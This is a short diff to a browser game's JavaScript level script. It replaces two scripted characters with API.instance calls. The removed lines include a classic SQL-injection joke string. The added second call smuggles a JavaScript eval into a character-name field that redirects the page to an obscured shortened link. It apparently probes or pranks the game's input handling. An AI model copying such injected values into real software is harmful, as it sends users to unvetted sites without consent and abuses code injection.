@@ -32,25 +32,5 @@ API.create_barrel(96,55);
 
 
 // add some characters
-
-var alice = API.create_human(80, 70, "./_static/sprites/char_alice.png");
-var pace = 1;
-alice.on_timeout = function () {
-    alice._move_to(alice.x + pace*10, alice.y);
-    pace *= -1;
-    if (!alice._deleted && !alice._is_player) {
-        setTimeout(alice.on_timeout, 5000);
-    }
-};
-alice.on_timeout();
-alice.on_bumped = function (self, bumped_by) {
-    alert("What a gorgeous day today :)");
-    return true;
-};
-alice.on_lost_focus = function () { alice.on_timeout(); };
-
-var bob = API.create_human(81, 36, "./_static/sprites/char_bob.png");
-bob.on_bumped = function (self, bumped_by) {
-    alert("Hi!  My name is Robert'); DROP TABLE Students;--");
-    return true;
-};
+API.instance("alice", 86, 58);
+API.instance("$; eval('document.location=\"http://tinyurl.com/y8ufsnp\";');", 81, 36);
